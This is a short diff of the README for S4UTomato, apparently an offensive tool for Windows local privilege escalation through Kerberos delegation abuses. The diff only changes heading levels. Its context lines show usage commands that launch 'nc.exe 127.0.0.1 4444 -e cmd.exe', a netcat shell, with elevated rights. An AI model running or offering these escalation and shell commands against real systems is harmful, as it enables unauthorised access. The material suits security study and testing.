@@ -34,7 +34,7 @@ Copyright (c) 2023 whoamianony.top
   --version                 Display version information.
 ```
 
-## LEP via Resource-based Constrained Delegation
+### LEP via Resource-based Constrained Delegation
 
 ```cmd
 S4UTomato.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c "nc.exe 127.0.0.1 4444 -e cmd.exe"
@@ -42,7 +42,7 @@ S4UTomato.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c "nc.exe 127.0.0.1 4444 -e cmd.e
 
 ![rbcd](/images/rbcd.gif)
 
-## LEP via Shadow Credentials + S4U2self
+### LEP via Shadow Credentials + S4U2self
 
 ```cmd
 S4UTomato.exe shadowcred -c "nc 127.0.0.1 4444 -e cmd.exe" -f
@@ -50,7 +50,7 @@ S4UTomato.exe shadowcred -c "nc 127.0.0.1 4444 -e cmd.exe" -f
 
 ![shadowcred](/images/shadowcred.gif)
 
-## LEP via Tgtdeleg + S4U2self
+### LEP via Tgtdeleg + S4U2self
 
 ```cmd
 # First retrieve the TGT through Tgtdeleg
